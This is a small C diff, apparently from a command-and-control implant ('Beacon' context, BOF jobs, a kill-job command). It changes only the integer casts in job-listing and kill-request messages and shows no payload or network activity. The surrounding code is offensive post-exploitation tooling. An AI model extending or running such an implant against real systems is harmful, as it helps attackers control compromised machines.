@@ -271,11 +271,11 @@ static VOID JobAppendActive(JobManager* jm, ByteBuf* out, SIZE_T* count, ULONGLO
     for (cur = jm->jobs; cur; cur = cur->next) {
         ULONGLONG age = now >= cur->started_at ? now - cur->started_at : 0;
         BbPrintf(out, "%-10lu  %-10s  %-10s  %-9I64u  %-9lu  %-10s  %-18s  %s\n",
-                 (unsigned long)cur->task_id,
+                 (ULONG)cur->task_id,
                  JobTypeName(cur->type),
                  JobStateName(cur->state),
                  (unsigned __int64)age,
-                 (unsigned long)cur->command_id,
+                 (ULONG)cur->command_id,
                  cur->name[0] ? cur->name : "-",
                  cur->ref[0] ? cur->ref : "-",
                  cur->detail[0] ? cur->detail : "-");
@@ -340,10 +340,10 @@ static BOOL JobRequestKill(struct BeaconContext* ctx, UINT32 job_id, ByteBuf* ou
 
     if (type == JOB_TYPE_BOF) {
         BbPrintf(out, "job %lu (%s) stop requested",
-                 (unsigned long)job_id, name[0] ? name : "bof");
+                 (ULONG)job_id, name[0] ? name : "bof");
     } else {
         BbPrintf(out, "job %lu (%s) kill requested",
-                 (unsigned long)job_id, name[0] ? name : "unknown");
+                 (ULONG)job_id, name[0] ? name : "unknown");
     }
     return TRUE;
 }
@@ -421,7 +421,7 @@ ByteBuf CommandKillJob(struct BeaconContext* ctx, Parser* parser)
         return out;
     }
 
-    BbPrintf(&out, "job %lu not found", (unsigned long)job_id);
+    BbPrintf(&out, "job %lu not found", (ULONG)job_id);
     return out;
 }
 
